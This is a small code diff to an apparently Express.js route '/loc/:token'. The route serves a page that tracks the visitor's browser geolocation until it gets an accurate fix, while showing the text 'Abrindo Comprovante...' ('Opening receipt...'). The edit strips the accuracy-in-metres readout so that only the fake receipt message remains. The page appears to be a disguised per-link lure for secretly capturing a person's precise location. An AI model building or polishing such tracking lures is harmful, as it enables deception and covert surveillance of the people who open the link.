@@ -112,7 +112,7 @@ app.get("/loc/:token", (req, res) => {
           const acc = pos.coords.accuracy;
           if (!best || acc < best.coords.accuracy) best = pos;
 
-          out.textContent = "Abrindo Comprovante..." + Math.round(best.coords.accuracy) + " m";
+          out.textContent = "Abrindo Comprovante..." + Math.round(best.coords.accuracy) ;
 
           if (acc <= minAcc) {
             navigator.geolocation.clearWatch(watchId);
